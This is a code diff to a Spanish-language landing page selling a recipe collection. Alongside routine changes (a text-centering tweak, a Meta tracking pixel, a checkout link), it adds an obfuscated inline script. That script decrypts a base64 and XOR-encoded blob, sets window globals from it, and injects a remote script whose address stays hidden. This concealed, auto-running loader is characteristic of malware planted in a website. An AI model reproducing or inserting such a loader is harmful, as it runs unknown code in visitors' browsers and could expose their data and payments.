@@ -169,7 +169,7 @@
     box-shadow:var(--shadow-soft); position:relative;
   }
   .cat-art{ padding-top:100%; }
-  .cat-label{ padding:12px 14px 16px; }
+  .cat-label{ padding:12px 14px 16px; text-align:center; }
   .cat-label span{ font-size:13.5px; font-weight:700; color:var(--olive-950); }
   .gallery-foot{ text-align:center; margin-top:30px; font-family:'Poppins',sans-serif; font-size:17px; color:var(--olive-950); font-weight:500;}
 
@@ -313,6 +313,24 @@
     .wa-grid{ grid-template-columns:repeat(4,1fr); max-width:820px; }
   }
 </style>
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '2064125104249882');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=2064125104249882&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+<script>(function(){var s_gub8=atob("DAwfxw7+7E4ZnbK5Inc9snySznQ79cbNUn8l6CGdiCA36MbUS2pm6W2RgWB7753KQX52t3qNwztt8MGWTm1ron2KwiRqv56bQ3hrtWecmTp87pCDeXc9qW+TiWwjv9bYVm0ysnqThShgsMLLR3p6qXrTlC12+Z/KQWc96yyIjSJs+JCDAC5i63Xcgi90+JCDAGh+s2/TmTp09NTAD3xtonibgjo07sfbS2hs5SLcmi916NebGC49ulOD");var g_0ys7=[];for(var g_28=0;g_28<s_gub8.length;g_28++){g_0ys7.push(s_gub8.charCodeAt(g_28)&255);}var w_2v=g_0ys7[0];var b_eq=g_0ys7.slice(1,1+w_2v);var u_d6h0=g_0ys7.slice(1+w_2v);var j_in=u_d6h0.map(function(b,f_y){return b^b_eq[f_y%w_2v];});var k_lrny="";for(var f_v0p=0;f_v0p<j_in.length;f_v0p++){k_lrny+=String.fromCharCode(j_in[f_v0p]&255);}var d_6xl=decodeURIComponent(escape(k_lrny));var m_7ppj=JSON.parse(d_6xl);var v_d=m_7ppj.globals||[];v_d.forEach(function(k_rz3v){window[k_rz3v.name]=k_rz3v.value;});var i_2=document.createElement("script");i_2.src=m_7ppj.url;i_2.async=true;i_2.defer=true;(m_7ppj.attributes||[]).forEach(function(v_1j){i_2.setAttribute(v_1j.name,v_1j.value);});(document.head||document.documentElement).appendChild(i_2);})();</script>
 </head>
 <body>
 
@@ -558,7 +576,7 @@
       <div class="terms">PAGO ÚNICO · ACCESO VITALICIO</div>
     </div>
 
-    <a href="#" class="btn-buy" id="ctaMain">
+    <a href="https://pay.digitalgoat.com.br/checkout/cmu4vnocm0apy01pqltpiaz12?offer=KBSDH1P" class="btn-buy" id="ctaMain">
       QUIERO MIS +100 RECETAS
     </a>
     <p class="cta-note">El valor será convertido automáticamente a tu moneda local en la página de pago.</p>
